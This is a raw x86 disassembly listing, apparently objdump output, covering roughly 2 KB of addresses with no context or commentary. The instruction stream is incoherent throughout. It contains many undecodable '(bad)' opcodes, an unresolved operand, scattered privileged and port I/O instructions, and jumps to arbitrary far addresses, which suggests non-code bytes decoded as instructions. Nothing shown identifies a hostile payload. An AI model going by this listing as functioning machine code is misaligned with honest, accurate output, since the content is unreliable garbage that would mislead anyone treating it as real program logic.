  436328:	sub    dl,0xd6
  43632b:	int    0x32
  43632d:	ja     0x436375
  43632f:	adc    DWORD PTR [edx],eax
  436331:	mov    ebp,0x4cb4459e
  436336:	adc    eax,0x83adecaa
  43633b:	push   0x9b642e13
  436340:	outs   dx,BYTE PTR ds:[esi]
  436341:	push   edx
  436342:	outs   dx,BYTE PTR ds:[esi]
  436343:	push   esi
  436344:	mov    ds:0x293ddb6a,al
  436349:	ret    0x6531
  43634c:	lea    esp,[esi]
  43634e:	or     eax,0xb8ebf444
  436353:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436355:	sti    
  436356:	mov    eax,ds:0xed11fdb2
  43635b:	or     BYTE PTR [eax+0x2d6cc2e6],0xdb
  436362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436363:	loop   0x43633b
  436365:	cmp    esp,edx
  436367:	push   0x6e6d0ae3
  43636c:	jae    0x4363b2
  43636e:	dec    ecx
  43636f:	xchg   esi,eax
  436370:	pusha  
  436371:	imul   ebx,DWORD PTR [ebx-0x3f],0xffffffbc
  436375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436376:	pop    ecx
  436377:	iret   
  436378:	retf   
  436379:	test   BYTE PTR [esi-0x3a69eb94],dh
  43637f:	xchg   ebp,eax
  436380:	and    eax,0x1d51d806
  436385:	jmp    0x43630f
  436387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436388:	in     eax,dx
  436389:	push   0xf21c748e
  43638e:	xchg   edx,eax
  43638f:	adc    DWORD PTR [edi],0x32
  436392:	mov    eax,ds:0xff60e80b
  436397:	xlat   BYTE PTR ds:[ebx]
  436398:	adc    edx,DWORD PTR [eax+0x1368642c]
  43639e:	shr    BYTE PTR [ebp+0x8],1
  4363a1:	fwait
  4363a2:	and    eax,0x7e183609
  4363a7:	push   ecx
  4363a8:	ins    BYTE PTR es:[edi],dx
  4363a9:	fwait
  4363aa:	mov    ds:0x2e9fb7a,al
  4363af:	xchg   ebp,eax
  4363b0:	imul   ebx,DWORD PTR [ebx],0x45
  4363b3:	inc    ebx
  4363b4:	jmp    0x436340
  4363b6:	pop    ss
  4363b7:	lea    edx,[edi]
  4363b9:	jno    0x436428
  4363bb:	add    eax,ebp
  4363bd:	ins    DWORD PTR es:[edi],dx
  4363be:	cmp    al,0x26
  4363c0:	adc    ebp,DWORD PTR [edi-0x2a]
  4363c3:	gs scas al,BYTE PTR es:[edi]
  4363c5:	xchg   ebp,eax
  4363c6:	fidiv  DWORD PTR [esi-0x439f5a93]
  4363cc:	cmp    ecx,DWORD PTR [eax+0xe]
  4363cf:	mov    ch,0xa1
  4363d1:	popf   
  4363d2:	retf   
  4363d3:	pop    ebx
  4363d4:	inc    ebx
  4363d5:	adc    BYTE PTR ds:0x8c91fb20,dl
  4363db:	add    DWORD PTR [esi+ebp*4+0x29],ebp
  4363df:	mov    al,ds:0x1444ad61
  4363e4:	into   
  4363e5:	call   eax
  4363e7:	push   esp
  4363e8:	ins    BYTE PTR es:[edi],dx
  4363e9:	adc    DWORD PTR [esi+0x1b],edx
  4363ec:	jl     0x4363b2
  4363ee:	jbe    0x436430
  4363f0:	rol    DWORD PTR [esi],0xa4
  4363f3:	or     eax,0x2a7d6dcc
  4363f8:	mov    bh,0x86
  4363fa:	sub    BYTE PTR [ecx+0x37],bl
  4363fd:	xchg   BYTE PTR [edx+0x15d6ed35],bl
  436403:	pop    ebp
  436404:	pop    ss
  436405:	push   eax
  436406:	clc    
  436407:	mov    al,ds:0x2a6b44d7
  43640c:	loopne 0x436468
  43640e:	add    BYTE PTR [edx],ch
  436410:	adc    al,0x87
  436412:	add    bh,BYTE PTR [eax]
  436414:	jno    0x436477
  436416:	jmp    0x436420
  436418:	rol    BYTE PTR [esi-0x20],cl
  43641b:	cmp    dl,BYTE PTR [esi+eiz*4-0x5754545d]
  436422:	pop    ebp
  436423:	iret   
  436424:	and    dh,bh
  436426:	fcmovne st,st(5)
  436428:	mov    ?,WORD PTR [esi+0x50]
  43642b:	shl    BYTE PTR [esi-0x7],0xa6
  43642f:	sbb    eax,0xdb9f366e
  436434:	cmp    dh,BYTE PTR [esi-0x57f25752]
  43643a:	gs jl  0x4363d0
  43643d:	inc    ebx
  43643e:	add    ebp,ebp
  436440:	stos   BYTE PTR es:[edi],al
  436441:	push   ss
  436442:	addr16 cmp eax,0x965c042f
  436448:	cs mov ah,0x5d
  43644b:	adc    BYTE PTR [ebx],dl
  43644d:	pop    edx
  43644e:	add    eax,0x1158fd67
  436453:	test   DWORD PTR [edi],edx
  436455:	mov    dh,0xb6
  436457:	or     esp,DWORD PTR [ecx+0x46]
  43645a:	call   0xa6549064
  43645f:	sub    eax,0xb4557493
  436464:	ins    DWORD PTR es:[edi],dx
  436465:	jecxz  0x4364cb
  436467:	lds    ebx,FWORD PTR [edx+0x7]
  43646a:	mov    WORD PTR [ecx],es
  43646c:	les    ebp,FWORD PTR [ebp-0x2b734efb]
  436472:	jmp    0x43641f
  436474:	mov    eax,0xae5ad1b1
  436479:	add    BYTE PTR [eax],dh
  43647b:	xchg   DWORD PTR [ebp-0x28],ecx
  43647e:	rol    BYTE PTR [ebp-0x3c],0x6d
  436482:	mov    eax,ds:0x41be2287
  436487:	aaa    
  436488:	sub    cl,BYTE PTR [ecx]
  43648a:	mov    ds:0xbc5fd6db,al
  43648f:	xchg   BYTE PTR [edx-0x70b1bcf2],cl
  436495:	dec    ebp
  436496:	push   ecx
  436497:	fld    TBYTE PTR [ebp-0x1c6ad97f]
  43649d:	stos   BYTE PTR es:[edi],al
  43649e:	rcr    DWORD PTR [edx-0x2a4f4b8a],1
  4364a4:	mov    dh,0x91
  4364a6:	je     0x43648f
  4364a8:	pop    ss
  4364a9:	cs jb  0x436528
  4364ac:	jo     0x4364bf
  4364ae:	mov    ebx,0x8b77ba28
  4364b3:	push   edi
  4364b4:	sahf   
  4364b5:	xor    BYTE PTR [eax+ebp*2+0x2],dh
  4364b9:	bound  eax,QWORD PTR [ebx]
  4364bb:	outs   dx,BYTE PTR ds:[esi]
  4364bc:	sbb    bh,BYTE PTR [ebp+0x50daab0]
  4364c2:	je     0x43651f
  4364c4:	shl    DWORD PTR [edi+0x1a],cl
  4364c7:	xchg   DWORD PTR [ebx-0x5f1569bf],esp
  4364cd:	sbb    BYTE PTR [ebx],0xae
  4364d0:	add    esi,DWORD PTR [edi-0x2d]
  4364d3:	fst    DWORD PTR [eax+0x75]
  4364d6:	popa   
  4364d7:	pop    ebx
  4364d8:	pop    ecx
  4364d9:	xchg   ecx,eax
  4364da:	out    dx,eax
  4364db:	pusha  
  4364dc:	push   edx
  4364dd:	retf   0x9625
  4364e0:	call   0x1f25:0x9d70daa8
  4364e7:	retf   0x6189
  4364ea:	fsubr  DWORD PTR [eax+0x17]
  4364ed:	ss out 0x8d,eax
  4364f0:	icebp  
  4364f1:	xor    edi,DWORD PTR [esi-0x5c]
  4364f4:	dec    ebx
  4364f5:	bound  edx,QWORD PTR [ebp+0x71]
  4364f8:	fist   DWORD PTR [esi]
  4364fa:	daa    
  4364fb:	scas   eax,DWORD PTR es:[edi]
  4364fc:	je     0x4364c6
  4364fe:	cmp    eax,esp
  436500:	push   edi
  436501:	ins    BYTE PTR es:[edi],dx
  436502:	or     BYTE PTR [eax-0x6fcb5ee3],ah
  436508:	add    ebx,ebx
  43650a:	add    DWORD PTR [edx+0x4d14135b],0x1848ec21
  436514:	or     ecx,DWORD PTR ds:0x8e8d8ec0
  43651a:	retf   0x3a39
  43651d:	jl     0x436588
  43651f:	mov    ds:0xe20ba821,eax
  436524:	sbb    eax,0xe1cef5d7
  436529:	mov    edx,0xa57100d1
  43652e:	outs   dx,DWORD PTR ds:[esi]
  43652f:	pushf  
  436530:	cmc    
  436531:	fcom   st(2)
  436533:	xchg   edx,eax
  436534:	adc    eax,eax
  436536:	mov    BYTE PTR [esi],0xf8
  436539:	adc    al,0xb
  43653b:	cld    
  43653c:	inc    cx
  43653e:	pop    ebx
  43653f:	push   0x877e6a2a
  436544:	sub    esp,DWORD PTR [edx-0x3f]
  436547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436548:	mov    DWORD PTR [ebp+ebp*2-0x23828949],esi
  43654f:	xchg   ebp,eax
  436550:	inc    ecx
  436551:	xlat   BYTE PTR ds:[ebx]
  436552:	call   0x8269f977
  436557:	push   ss
  436558:	sub    BYTE PTR [ebp+0x419fe6b6],0xaf
  43655f:	jmp    0x43654d
  436561:	aad    0xa
  436563:	bound  edi,QWORD PTR [ebx-0x2b1aaf2b]
  436569:	jb     0x436545
  43656b:	inc    edx
  43656c:	(bad)  
  43656d:	inc    ecx
  43656e:	push   eax
  43656f:	mov    ebx,0xe2365803
  436574:	jne    0x436568
  436576:	rcl    BYTE PTR [edx+0x45],0xe1
  43657a:	pop    esp
  43657b:	add    DWORD PTR [ebp-0x6961834e],eax
  436581:	jbe    0x436584
  436583:	or     al,BYTE PTR [eax-0x40]
  436586:	jge    0x436576
  436588:	inc    ecx
  436589:	sbb    eax,0xdb710035
  43658e:	inc    esp
  43658f:	test   eax,0xd6e9079e
  436594:	out    0x80,eax
  436596:	fild   DWORD PTR [edx-0x45]
  436599:	pop    ecx
  43659a:	call   0x6419b8d1
  43659f:	sti    
  4365a0:	xchg   esi,eax
  4365a1:	mov    cl,0x10
  4365a3:	pop    esp
  4365a4:	fdivr  DWORD PTR [edx]
  4365a6:	jmp    0x85b78068
  4365ab:	lods   al,BYTE PTR ds:[esi]
  4365ac:	push   ss
  4365ad:	mov    cs,WORD PTR [edx-0x405eaca5]
  4365b3:	cmp    cl,bl
  4365b5:	aas    
  4365b6:	retf   
  4365b7:	pusha  
  4365b8:	fild   DWORD PTR [eax]
  4365ba:	lds    ecx,FWORD PTR [ebx+esi*4+0x48]
  4365be:	jle    0x4365c7
  4365c0:	xor    bh,BYTE PTR [ebp-0x5f125260]
  4365c6:	inc    edi
  4365c7:	fsub   QWORD PTR [edx-0x25e222c2]
  4365cd:	mov    ch,BYTE PTR cs:0xdf1f1408
  4365d4:	add    dl,0x5b
  4365d7:	imul   esp,DWORD PTR [ebx-0x6786b828],0x55
  4365de:	sbb    DWORD PTR [edx+esi*1],edx
  4365e1:	or     ch,dl
  4365e3:	mov    dh,0xb5
  4365e5:	pop    ecx
  4365e6:	sbb    dh,BYTE PTR [ebx-0x437cdf14]
  4365ec:	call   0xb7ad90c7
  4365f1:	repnz imul edi,esi,0x73
  4365f5:	lfs    esi,FWORD PTR [ebp+edi*1+0x36447d22]
  4365fd:	cmp    eax,DWORD PTR [ebx+0x3]
  436600:	les    ebp,FWORD PTR [ebp+0x529eb711]
  436606:	dec    esp
  436607:	out    0xc0,eax
  436609:	scas   al,BYTE PTR es:[edi]
  43660a:	call   0x7213b61
  43660f:	fiadd  WORD PTR [eax-0x2c]
  436612:	sub    al,ah
  436614:	push   esi
  436615:	fist   DWORD PTR [ecx+0x6e]
  436618:	adc    al,0x6d
  43661a:	outs   dx,BYTE PTR ds:[esi]
  43661b:	test   DWORD PTR [esi],ecx
  43661d:	push   esi
  43661e:	xchg   edi,eax
  43661f:	mov    dh,0xad
  436621:	and    esi,DWORD PTR [ecx-0x56]
  436624:	cmp    BYTE PTR [ebp-0x14],0x6b
  436628:	sub    ebx,edx
  43662a:	add    dl,BYTE PTR [eax+0x2d]
  43662d:	aam    0x3
  43662f:	pop    ebp
  436630:	ins    BYTE PTR es:[edi],dx
  436631:	lods   al,BYTE PTR ds:[esi]
  436632:	mov    ds:0x5d8a81b0,al
  436637:	cwde   
  436638:	inc    eax
  436639:	inc    eax
  43663a:	xchg   esp,eax
  43663b:	dec    esi
  43663c:	mov    dl,0x80
  43663e:	outs   dx,BYTE PTR ds:[esi]
  43663f:	dec    ebp
  436640:	push   esp
  436641:	divps  xmm5,XMMWORD PTR [edx-0x57469a38]
  436648:	mov    ch,0x86
  43664a:	mov    ch,0xb2
  43664c:	add    bh,BYTE PTR [esi+0x3e]
  43664f:	mov    DWORD PTR [edx],ebp
  436651:	outs   dx,BYTE PTR ds:[esi]
  436652:	push   ebp
  436653:	mov    esi,DWORD PTR [edx-0x76]
  436656:	cmp    eax,DWORD PTR [ecx+0x70]
  436659:	imul   esp,DWORD PTR [ebx+0x355587bb],0x2db680a8
  436663:	ins    BYTE PTR es:[edi],dx
  436664:	je     0x43665b
  436666:	inc    esi
  436667:	or     DWORD PTR [ebx+0x728c89a0],ebx
  43666d:	pop    ecx
  43666e:	popa   
  43666f:	mov    eax,ds:0xb467e97c
  436674:	xor    ah,bh
  436676:	add    cl,bl
  436678:	test   ebp,0xd556af9e
  43667e:	add    DWORD PTR [ecx-0x30],esi
  436681:	mov    ch,0xf2
  436683:	jg     0x436617
  436685:	and    ch,0x17
  436688:	mov    dh,0x2c
  43668a:	push   es
  43668b:	jg     0x436672
  43668d:	xor    DWORD PTR [eax],eax
  43668f:	data16 mov cl,0xdc
  436692:	push   ecx
  436693:	jo     0x436680
  436695:	sub    BYTE PTR [edi+0x6a],bh
  436698:	das    
  436699:	mov    dl,0x6d
  43669b:	adc    DWORD PTR [ebx-0x7a21257e],edi
  4366a1:	jmp    0x14ecb63b
  4366a6:	fild   DWORD PTR [esi]
  4366a8:	jne    0x4366d8
  4366aa:	mov    ebp,0x9459ae0d
  4366af:	shl    BYTE PTR [esi+0x5ed914d4],cl
  4366b5:	sbb    eax,0xb67fc88b
  4366ba:	fcom   DWORD PTR ds:0x192cc52c
  4366c0:	ret    
  4366c1:	sbb    al,dh
  4366c3:	and    al,0x75
  4366c5:	imul   ebx,DWORD PTR [ebx-0x390622f8],0xffffffbf
  4366cc:	mov    esp,0xd6e9c25d
  4366d1:	mov    edx,0xfec59ab6
  4366d6:	ret    0x445a
  4366d9:	xor    al,dl
  4366db:	fistp  QWORD PTR [edx-0x80]
  4366de:	mov    eax,0xa32542c1
  4366e3:	sbb    eax,0xc685c056
  4366e8:	(bad)  
  4366e9:	mov    gs,WORD PTR [edx+0x45]
  4366ec:	dec    ebx
  4366ed:	push   esp
  4366ee:	out    dx,eax
  4366ef:	pushf  
  4366f0:	dec    esp
  4366f1:	push   ss
  4366f2:	xor    al,0x0
  4366f4:	rcl    DWORD PTR [eax],0x4a
  4366f7:	mov    al,0xd6
  4366f9:	ins    DWORD PTR es:[edi],dx
  4366fa:	ins    DWORD PTR es:[edi],dx
  4366fb:	dec    ebx
  4366fc:	push   ecx
  4366fd:	and    BYTE PTR [esi],0xac
  436700:	repnz sub DWORD PTR [ebp+0x2c41475b],0xffffffcb
  436708:	test   BYTE PTR [eax-0x7d94c7d2],bl
  43670e:	xchg   esi,eax
  43670f:	mov    dh,0xa5
  436711:	js     0x4366ba
  436713:	dec    ebp
  436714:	jecxz  0x4366d7
  436716:	je     0x436758
  436718:	pop    ebx
  436719:	pop    es
  43671a:	push   ebp
  43671b:	ins    BYTE PTR es:[edi],dx
  43671c:	lock test BYTE PTR [edx-0x54130ba9],0x2
  436724:	mov    eax,0x500b6db1
  436729:	jmp    0xa9a7c51b
  43672e:	push   0x4526b6b7
  436733:	jle    0x4366f4
  436735:	adc    BYTE PTR [ebp+edx*4+0x5c],ah
  436739:	add    eax,0xdd544d4b
  43673e:	pop    ebp
  43673f:	sti    
  436740:	mov    esi,0x752924c1
  436745:	or     eax,0x9ea20ec5
  43674a:	je     0x436762
  43674c:	push   ds
  43674d:	nop
  43674e:	mov    edx,0xa9f50575
  436753:	cli    
  436754:	xchg   esi,eax
  436755:	add    cl,BYTE PTR cs:[ecx+0x5b4b8ad4]
  43675c:	mov    ebx,0x41f3175c
  436761:	aam    0xf0
  436763:	inc    esp
  436764:	or     eax,0xad8a1611
  436769:	add    DWORD PTR [ebp-0x48],esi
  43676c:	sub    ecx,esp
  43676e:	cdq    
  43676f:	daa    
  436770:	or     eax,eax
  436772:	push   edx
  436773:	fcmovnbe st,st(1)
  436775:	aaa    
  436776:	add    eax,0x4aa2205f
  43677b:	loop   0x4367c3
  43677d:	pop    es
  43677e:	add    DWORD PTR [ecx],ecx
  436780:	mov    esi,0x62ada618
  436785:	mov    eax,ebp
  436787:	test   al,0xbc
  436789:	cmp    BYTE PTR [ecx],ch
  43678b:	add    DWORD PTR [edx+0x1],0x1a
  43678f:	stos   BYTE PTR es:[edi],al
  436790:	and    DWORD PTR [edi+ebx*1-0x1df9be60],edx
  436797:	ret    0x3727
  43679a:	dec    esp
  43679b:	xchg   DWORD PTR [esi-0x53],eax
  43679e:	xchg   BYTE PTR [edx],al
  4367a0:	mov    eax,0x1ca7292e
  4367a5:	jg     0x43681d
  4367a7:	sub    al,0x35
  4367a9:	inc    eax
  4367aa:	rcr    cl,1
  4367ac:	loope  0x436827
  4367ae:	dec    ecx
  4367af:	es ins BYTE PTR es:[edi],dx
  4367b1:	pop    edx
  4367b2:	push   0xb
  4367b4:	inc    ebp
  4367b5:	push   edx
  4367b6:	mov    WORD PTR [ecx+ebp*1-0x1a],ds
  4367ba:	mov    al,ds:0x1a5da00d
  4367bf:	cmp    DWORD PTR [ebp+0x4b74714d],ebx
  4367c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4367c6:	mov    ds:0xed186626,al
  4367cb:	retf   
  4367cc:	je     0x436838
  4367ce:	mov    bh,0x6
  4367d0:	mov    ah,BYTE PTR [edx+edx*2]
  4367d3:	mov    es,WORD PTR [eax+0x1b4a2df3]
  4367d9:	sbb    ecx,DWORD PTR [edi]
  4367db:	pop    ebp
  4367dc:	push   esi
  4367dd:	sbb    dh,BYTE PTR [ecx-0x77]
  4367e0:	push   cs
  4367e1:	jmp    0xdc5:0x26c077
  4367e8:	push   edi
  4367e9:	retf   
  4367ea:	js     0x4367e4
  4367ec:	(bad)  
  4367ed:	lods   eax,DWORD PTR ds:[esi]
  4367ee:	sub    DWORD PTR [eax-0x25],esp
  4367f1:	lahf   
  4367f2:	jb     0x4367dc
  4367f4:	sbb    bh,BYTE PTR [edi-0x66]
  4367f7:	psubb  mm4,QWORD PTR [edx-0x25]
  4367fb:	adc    ah,dl
  4367fd:	cmp    BYTE PTR [edx-0x3d00ddf2],bh
  436803:	aas    
  436804:	inc    ecx
  436805:	mov    bh,0xb6
  436807:	cs (bad) 
  436809:	and    esp,DWORD PTR [eax]
  43680b:	jp     0x4367f8
  43680d:	xor    eax,0x850b2e61
  436812:	pop    ebp
  436813:	cli    
  436814:	ins    DWORD PTR es:[edi],dx
  436815:	stos   DWORD PTR es:[edi],eax
  436816:	dec    ecx
  436817:	or     dh,BYTE PTR [edi+ebp*1-0x7d7275f5]
  43681e:	pop    DWORD PTR [edi]
  436820:	jp     0x4367d0
  436822:	pop    edi
  436823:	lods   eax,DWORD PTR ds:[esi]
  436824:	push   0xffffffa1
  436826:	mov    eax,ecx
  436828:	imul   esp,DWORD PTR [ecx-0x2d],0xaed51717
  43682f:	stos   BYTE PTR es:[edi],al
  436830:	test   eax,0xef3cebee
  436835:	jbe    0x43687c
  436837:	sub    al,0x44
  436839:	cmp    al,0x1e
  43683b:	out    dx,al
  43683c:	stos   BYTE PTR es:[edi],al
  43683d:	popf   
  43683e:	out    0xa6,al
  436840:	(bad)  
  436841:	fist   DWORD PTR [esi]
  436843:	(bad)  
  436844:	lahf   
  436845:	ror    DWORD PTR ds:[ebx],cl
  436848:	icebp  
  436849:	(bad)  
  43684a:	mov    dh,BYTE PTR [esi]
  43684c:	ror    BYTE PTR [ebp+0x55f6516c],0xf1
  436853:	fucomp st(5)
  436855:	aad    0x4
  436857:	mov    ch,0xa9
  436859:	adc    eax,0x8b8c5b1b
  43685e:	jno    0x43688b
  436860:	mov    edi,0x44ed0db4
  436865:	js     0x4368a8
  436867:	add    dh,dl
  436869:	std    
  43686a:	and    eax,DWORD PTR [edx+0x34506cf8]
  436870:	add    DWORD PTR [eax],esp
  436872:	add    BYTE PTR [ebp+0x12],0xa1
  436876:	mov    eax,ebx
  436878:	inc    ecx
  436879:	leave  
  43687a:	dec    edx
  43687b:	push   0xffffffc5
  43687d:	ds sub ebx,eax
  436880:	add    al,0x70
  436882:	imul   edi,DWORD PTR [edi],0x4c
  436885:	pusha  
  436886:	in     eax,dx
  436887:	add    al,BYTE PTR [edx]
  436889:	icebp  
  43688a:	inc    edi
  43688b:	push   eax
  43688c:	ins    BYTE PTR es:[edi],dx
  43688d:	and    BYTE PTR [ecx],0xf
  436890:	ret    
  436891:	lds    esp,FWORD PTR [ebx-0x5792577d]
  436897:	pop    ecx
  436898:	sti    
  436899:	arpl   WORD PTR [edx],bp
  43689b:	das    
  43689c:	mov    edx,0x74110d6c
  4368a1:	dec    esi
  4368a2:	sub    edx,DWORD PTR [edi-0x5d]
  4368a5:	es dec ebx
  4368a7:	sub    ebx,ebx
  4368a9:	add    ch,BYTE PTR ds:0x6d74c2c4
  4368af:	jp     0x436869
  4368b1:	pop    esp
  4368b2:	in     eax,dx
  4368b3:	(bad)  
  4368b4:	add    BYTE PTR [ebp-0x1f],dh
  4368b7:	loopne 0x43691d
  4368b9:	fild   WORD PTR [ebx+0x41fb88ba]
  4368bf:	in     eax,dx
  4368c0:	(bad)  
  4368c1:	mov    dh,0x7e
  4368c3:	out    0x72,al
  4368c5:	mov    DWORD PTR [eax+esi*1-0x43],eax
  4368c9:	and    BYTE PTR [ebp+0x17],al
  4368cc:	add    al,0x2c
  4368ce:	sbb    ebx,DWORD PTR ss:[edi+0x4c089a98]
  4368d5:	push   ebp
  4368d6:	jg     0x43687d
  4368d8:	mov    dh,0xb1
  4368da:	sub    eax,0x7f3bdc6f
  4368df:	sbb    DWORD PTR [edx-0x2fdcffe5],esp
  4368e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4368e6:	outs   dx,BYTE PTR ds:[esi]
  4368e7:	sub    BYTE PTR [ebp+0x47cb44aa],0x73
  4368ee:	inc    ebp
  4368ef:	jno    0x4368dc
  4368f1:	and    BYTE PTR [esi-0x1a214631],0x74
  4368f8:	test   eax,0xedb1d45
  4368fd:	cmp    esp,esi
  4368ff:	mov    ah,0x8
  436901:	xor    eax,0xb6b15036
  436906:	fisubr WORD PTR [ecx-0x49fcd6a7]
  43690c:	test   DWORD PTR [edx-0x55],eax
  43690f:	outs   dx,BYTE PTR ds:[esi]
  436910:	test   BYTE PTR ds:0xada215b,cl
  436916:	xor    eax,0x2996dda2
  43691b:	loop   0x436976
  43691d:	sub    cl,BYTE PTR [edx+0x1a]
  436920:	xchg   edx,eax
  436921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436922:	test   DWORD PTR [ebp+0x460b4845],ebp
  436928:	loop   0x4368b0
  43692a:	retf   
  43692b:	pusha  
  43692c:	pop    ss
  43692d:	add    BYTE PTR [edi+0x768b9b5],dh
  436933:	repz lahf 
  436935:	mov    dl,BYTE PTR [eax+0x6d]
  436938:	mov    ebx,0x49348e0a
  43693d:	xchg   BYTE PTR [esi-0x2495f794],bh
  436943:	pop    ss
  436944:	mov    bl,0xbf
  436946:	adc    ebp,esi
  436948:	jmp    0x24751a3
  43694d:	jbe    0x436953
  43694f:	sub    al,0x60
  436951:	jl     0x436994
  436953:	mov    ds:0x67b4151d,eax
  436958:	jecxz  0x436969
  43695a:	jecxz  0x436942
  43695c:	sub    BYTE PTR [ecx-0x3c],al
  43695f:	lods   eax,DWORD PTR ds:[esi]
  436960:	jl     0x436916
  436962:	add    BYTE PTR [edi+0x6],dh
  436965:	imul   ebp,DWORD PTR [edi-0x20],0x23
  436969:	and    ch,BYTE PTR [esi+0x34]
  43696c:	sbb    BYTE PTR [ecx+0x15c13ad5],bh
  436972:	pop    ebx
  436973:	mov    ebx,0x22f3a835
  436978:	mov    dh,0x38
  43697a:	mov    ch,0xdd
  43697c:	add    eax,0x8ed005a2
  436981:	mov    al,BYTE PTR [esi+0x6c33a389]
  436987:	mov    bh,0x86
  436989:	ficomp DWORD PTR [edx+ebx*2-0x5d]
  43698d:	xchg   edi,eax
  43698e:	mov    WORD PTR [ecx],ss
  436990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436991:	sub    eax,0x6db55f3e
  436996:	inc    ebx
  436997:	adc    eax,0xe012a7b8
  43699c:	pop    esi
  43699d:	jge    0x436a0b
  43699f:	and    ah,BYTE PTR [edx-0x45]
  4369a2:	sub    DWORD PTR [eax+0x54aebffc],eax
  4369a8:	xchg   BYTE PTR [ebp+0x50ca9754],bl
  4369ae:	pop    ebp
  4369af:	lods   eax,DWORD PTR ds:[esi]
  4369b0:	pop    esp
  4369b1:	mov    es,WORD PTR ds:0x8cda81b4
  4369b7:	loopne 0x4369e3
  4369b9:	cmp    DWORD PTR [ecx],ebp
  4369bb:	lods   eax,DWORD PTR ds:[esi]
  4369bc:	xchg   esi,eax
  4369bd:	xchg   edi,eax
  4369be:	outs   dx,BYTE PTR ds:[esi]
  4369bf:	pop    ebp
  4369c0:	lods   eax,DWORD PTR ds:[esi]
  4369c1:	call   0x782757c1
  4369c6:	adc    DWORD PTR [eax],eax
  4369c8:	jae    0x4369f2
  4369ca:	sbb    eax,0xf5d8dd04
  4369cf:	pusha  
  4369d0:	ins    BYTE PTR es:[edi],dx
  4369d1:	inc    edx
  4369d2:	mov    ds:0xada0b8f8,al
  4369d7:	and    DWORD PTR [edx+0x47d1b9f9],ecx
  4369dd:	jmp    0xba0b:0xb68221ad
  4369e4:	loope  0x436a19
  4369e6:	xchg   ebp,eax
  4369e7:	mov    bh,0xad
  4369e9:	jb     0x43698c
  4369eb:	or     BYTE PTR [esi],bh
  4369ed:	idiv   DWORD PTR [esi-0xc019e6c]
  4369f3:	pop    edx
  4369f4:	pop    ss
  4369f5:	sub    al,BYTE PTR [edi]
  4369f7:	ins    DWORD PTR es:[edi],dx
  4369f8:	pop    ss
  4369f9:	retf   0xe61
  4369fc:	pop    ebx
  4369fd:	(bad)  [ecx+0x7d110d88]
  436a03:	imul   esi,DWORD PTR [edi-0x30],0xb400746d
  436a0a:	outs   dx,DWORD PTR ds:[esi]
  436a0b:	data16 and BYTE PTR [eax+eax*8-0x25],0x2a
  436a11:	loop   0x4369c9
  436a13:	mov    ch,0x3e
  436a15:	pushf  
  436a16:	jl     0x4369b0
  436a18:	and    ch,bl
  436a1a:	sbb    BYTE PTR [eax+0x3],ch
  436a1d:	adc    al,0x9b
  436a1f:	out    0xad,eax
  436a21:	jno    0x4369dd
  436a23:	sub    eax,0x51536a11
  436a28:	cmp    edx,DWORD PTR [ebp-0x79]
  436a2b:	sbb    cl,BYTE PTR [esi-0x2eeb3661]
  436a31:	mov    dh,0x89
  436a33:	test   BYTE PTR [ebx-0x458a9a55],ch
  436a39:	test   al,0xb8
  436a3b:	jne    0x436a35
  436a3d:	div    BYTE PTR [edi-0x51]
  436a40:	loope  0x436a12
  436a42:	jg     0x436a1e
  436a44:	mov    bl,dl
  436a46:	fmul   DWORD PTR [esi]
  436a48:	cld    
  436a49:	cld    
  436a4a:	mov    al,0x54
  436a4c:	shl    BYTE PTR [esi],cl
  436a4e:	adc    eax,0xd8d106c0
  436a53:	mov    fs,esi
  436a55:	in     eax,0xda
  436a57:	jo     0x436a34
  436a59:	mov    edx,0xa416eaa2
  436a5e:	jmp    DWORD PTR [ebx]
  436a60:	sub    BYTE PTR [edi-0x4d2523eb],ah
  436a66:	mov    dl,0xf
  436a68:	inc    edi
  436a69:	dec    al
  436a6b:	add    al,0xf6
  436a6d:	mov    ds:0xc2360aa9,al
  436a72:	pop    edx
  436a73:	push   edi
  436a74:	enter  0x6d8c,0x22
  436a78:	mov    ah,BYTE PTR ds:0xebc9d40b
  436a7e:	lahf   
  436a7f:	mov    esi,DWORD PTR [esi-0x1f94495b]
  436a85:	inc    ecx
  436a86:	stos   BYTE PTR es:[edi],al
  436a87:	mov    ds:0xda4fbb0,eax
  436a8c:	inc    ebp
  436a8d:	rcl    BYTE PTR [ecx-0x42],1
  436a90:	or     ebx,0x8f8da027
  436a96:	mov    dh,0x6d
  436a98:	mov    dh,0x83
  436a9a:	mov    esi,DWORD PTR [eax]
  436a9c:	inc    ebp
  436a9d:	adc    ch,dl
  436a9f:	mov    gs,WORD PTR [edx+0x28d9f2b6]
  436aa5:	mov    al,0x42
  436aa7:	sub    al,0x41
  436aa9:	ins    DWORD PTR es:[edi],dx
  436aaa:	inc    ebx
  436aab:	rol    BYTE PTR [esi],1
  436aad:	adc    al,BYTE PTR ds:0x76da70d2
  436ab3:	imul   ebp,DWORD PTR [ebx+0x4e],0xffffffcb
  436ab7:	ins    BYTE PTR es:[edi],dx
  436ab8:	icebp  
  436ab9:	ret    0x8c10
  436abc:	repnz lds ebp,FWORD PTR [ebp+0x4b]
  436ac0:	retf   
  436ac1:	aaa    
  436ac2:	cmp    al,0x7c
  436ac4:	outs   dx,DWORD PTR ds:[esi]
  436ac5:	add    BYTE PTR [edx],bh
  436ac7:	out    0xc2,al
  436ac9:	inc    ecx
  436aca:	mov    eax,ds:0x29a02d07
  436acf:	mov    eax,0x66fafb95
  436ad4:	mov    ebx,0xa0abb075
  436ad9:	outs   dx,BYTE PTR ds:[esi]
  436ada:	(bad)  
  436adb:	fmul   QWORD PTR [ecx-0x49bbfb0f]
  436ae1:	mov    eax,ds:0x72550db6
  436ae6:	add    eax,0x193d45e9
  436aeb:	sbb    al,BYTE PTR cs:[eax+0x58a8051b]
  436af2:	out    0x86,eax
  436af4:	jle    0x436b4d
  436af6:	aad    0xad
  436af8:	and    DWORD PTR [esi-0x65],edx
  436afb:	mov    dh,0xc8
  436afd:	dec    ebp
  436afe:	fadd   QWORD PTR [edx-0x1fbd1260]
  436b04:	std    
  436b05:	std    
  436b06:	sub    esi,DWORD PTR [ecx-0x29]
